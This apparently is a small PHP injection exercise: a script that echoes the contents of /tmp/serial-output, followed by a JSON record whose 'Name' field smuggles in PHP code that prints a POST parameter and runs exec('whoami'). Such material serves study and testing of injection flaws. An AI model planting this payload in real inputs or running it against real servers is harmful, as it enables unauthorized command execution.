<?php
$serialoutput = "/tmp/serial-output";
if ($filehandler = fopen($serialoutput, "r")) {
    # Processing
    while(!feof($filehandler)) {
        echo fgetc($filehandler);
    }

    fclose($filehandler);
}
?>


{
  "Name": "<?php print($_POST["property"]); echo exec('whoami'); ?>",
  "Value": 101,
  "Commited": true
}
